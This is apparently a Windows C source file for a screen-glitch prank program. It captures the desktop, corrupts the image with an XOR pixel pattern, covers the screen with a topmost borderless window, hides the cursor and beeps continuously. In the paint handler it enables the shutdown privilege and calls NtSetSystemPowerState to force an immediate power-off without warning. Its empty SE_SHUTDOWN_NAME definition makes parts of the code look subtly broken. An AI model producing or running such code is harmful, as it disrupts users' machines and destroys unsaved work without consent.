#define SE_SHUTDOWN_NAME
#include <windows.h>
#include <math.h>	

HMODULE hNTDLL;
TOKEN_PRIVILEGES tkp;
HANDLE hToken;

typedef enum _SHUTDOWN_ACTION {
ShutdownNoReboot, ShutdownReboot, ShutdownPowerOff
} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;
typedef DWORD (WINAPI* lpNtSetSystemPowerState)(IN POWER_ACTION SystemAction,IN SYSTEM_POWER_STATE MinSystemState,IN ULONG Flags);
lpNtSetSystemPowerState NtSetSystemPowerState;
					 
const char Title[] = "_";
RECT rect;
HBITMAP BMPHANDLE;
HDC SCREEN_HANDLE;
HBITMAP OLDBMPHANDLE;
BITMAP IMAGE;
HDC GLOBAL_SCREEN_HANDLE;
double c = 0.0;
HBITMAP ManipPixels(HBITMAP hBmp, HDC hBmpDC){
	HBITMAP RetBmp=NULL;
	if (hBmp){
		HDC BufferDC=CreateCompatibleDC(NULL);	  // DC for Source Bitmap
		if (BufferDC){
			HBITMAP hTmpBitmap = (HBITMAP) NULL;
			if (hBmpDC)
				if (hBmp == (HBITMAP)GetCurrentObject(hBmpDC, OBJ_BITMAP)){
				hTmpBitmap = CreateBitmap(1, 1, 1, 1, NULL);
				SelectObject(hBmpDC, hTmpBitmap);
			}
			HGDIOBJ PreviousBufferObject=SelectObject(BufferDC,hBmp);
			HDC DirectDC=CreateCompatibleDC(NULL); // DC for working
			if (DirectDC){
				BITMAP bm;
				GetObject(hBmp, sizeof(bm), &bm);
				BITMAPINFO RGB32BitsBITMAPINFO; 
				ZeroMemory(&RGB32BitsBITMAPINFO,sizeof(BITMAPINFO));
				RGB32BitsBITMAPINFO.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
				RGB32BitsBITMAPINFO.bmiHeader.biWidth=bm.bmWidth;
				RGB32BitsBITMAPINFO.bmiHeader.biHeight=bm.bmHeight;
				RGB32BitsBITMAPINFO.bmiHeader.biPlanes=1;
				RGB32BitsBITMAPINFO.bmiHeader.biBitCount=32;
				UINT * ptPixels;	
				HBITMAP DirectBitmap = CreateDIBSection(DirectDC, 
									   (BITMAPINFO *)&RGB32BitsBITMAPINFO, 
									   DIB_RGB_COLORS,
									   (void **)&ptPixels, 
									   NULL, 0);
				if (DirectBitmap){
					HGDIOBJ PreviousObject=SelectObject(DirectDC, DirectBitmap);
					BitBlt(DirectDC,0,0,bm.bmWidth,bm.bmHeight,BufferDC,0,0,SRCCOPY);
					unsigned int avg;
					int h, w;
					for (int i = ( (bm.bmWidth*bm.bmHeight)-1 ); i >= 0; i--){
						h = i%bm.bmHeight;
						w = i%bm.bmWidth;
						ptPixels[i] = (h%(w+1))^ptPixels[2*i/3];
					}
					SelectObject(DirectDC,PreviousObject);
					RetBmp=DirectBitmap;
				}
				DeleteDC(DirectDC);
			}			 
			if (hTmpBitmap){
				SelectObject(hBmpDC, hBmp);
				DeleteObject(hTmpBitmap);
			}
			SelectObject(BufferDC,PreviousBufferObject);
			DeleteDC(BufferDC);
		}
	}
	return RetBmp;
}

HBITMAP MakePrintScreen(){
	  HWND hWindow = GetDesktopWindow();
	  HDC hdcScreen = GetDC(NULL);
	  HBITMAP hbmC;
	  GetClientRect(hWindow,&rect);
	  if((hbmC = CreateCompatibleBitmap(hdcScreen,rect.right,rect.bottom)) != NULL){
			HDC hdcC;
			if((hdcC = CreateCompatibleDC(hdcScreen)) != NULL){
				  HBITMAP hbmOld = (HBITMAP)SelectObject(hdcC,hbmC);
				  BitBlt(hdcC,0,0,rect.right,rect.bottom,hdcScreen,0,0,SRCCOPY);
				  SelectObject(hdcC,hbmOld);
				  DeleteDC(hdcC);
			}
	  }
	  ReleaseDC(hWindow,hdcScreen);
	  return hbmC;
}

// Step 4: the Window Procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam){
	switch(msg){
		case WM_PAINT:
			PAINTSTRUCT ps;		 
			GLOBAL_SCREEN_HANDLE = BeginPaint(hwnd,&ps); 
			BitBlt(GLOBAL_SCREEN_HANDLE, 0, 0, IMAGE.bmWidth, IMAGE.bmHeight, SCREEN_HANDLE, 0, 0, SRCCOPY);
			EndPaint(hwnd, &ps);
			
			hNTDLL = LoadLibrary("NTDLL.DLL");
			NtSetSystemPowerState = (lpNtSetSystemPowerState)GetProcAddress(hNTDLL, "NtSetSystemPowerState");
			OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
			CloseHandle(hToken); 
			NtSetSystemPowerState(PowerActionShutdownOff,PowerSystemShutdown,1<<31);
		break;
		case WM_CLOSE:
			DestroyWindow(hwnd);
		break;
		case WM_LBUTTONDOWN:
		case WM_DESTROY:
			// image
			SelectObject(SCREEN_HANDLE,OLDBMPHANDLE);
			DeleteDC(SCREEN_HANDLE);
			DeleteObject(BMPHANDLE);
			
			PostQuitMessage(0);
		break;
		default:
			return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	WNDCLASSEX wc;
	HWND hwnd;
	MSG Msg;
	wc.cbSize		 = sizeof(WNDCLASSEX);
	wc.style		 = 0;
	wc.lpfnWndProc	 = WndProc;
	wc.cbClsExtra	 = 0;
	wc.cbWndExtra	 = 0;
	wc.hInstance	 = hInstance;
	wc.hIcon		 = NULL;
	wc.hCursor		 = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW);
	wc.lpszMenuName	 = NULL;
	wc.lpszClassName = Title;
	wc.hIconSm		 = NULL;
	RegisterClassEx(&wc);
	
	// image
	BMPHANDLE = MakePrintScreen();
	BMPHANDLE = ManipPixels(BMPHANDLE, SCREEN_HANDLE);
	GetObject((HGDIOBJ)BMPHANDLE,sizeof(BITMAP),(LPVOID)&IMAGE);
	SCREEN_HANDLE = CreateCompatibleDC(GLOBAL_SCREEN_HANDLE);
	OLDBMPHANDLE = (HBITMAP)SelectObject(SCREEN_HANDLE, BMPHANDLE);
	
	ShowCursor(FALSE);
	
	hwnd = CreateWindowEx(
		WS_EX_TOOLWINDOW|WS_EX_TOPMOST,
		Title, "",
		WS_POPUP|WS_VISIBLE|WS_SYSMENU,
		CW_USEDEFAULT, CW_USEDEFAULT, 
		rect.right, rect.bottom,
		NULL, NULL, hInstance, NULL
	);
	ShowWindow(hwnd, nCmdShow);
	UpdateWindow(hwnd);
	PeekMessage( &Msg, NULL, 0, 0, PM_NOREMOVE);
	while (Msg.message != WM_QUIT) {
		if (PeekMessage( &Msg, NULL, 0, 0, PM_REMOVE)) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		} else {
			Beep(100, 30);
		 }
	}
	return Msg.wParam;
}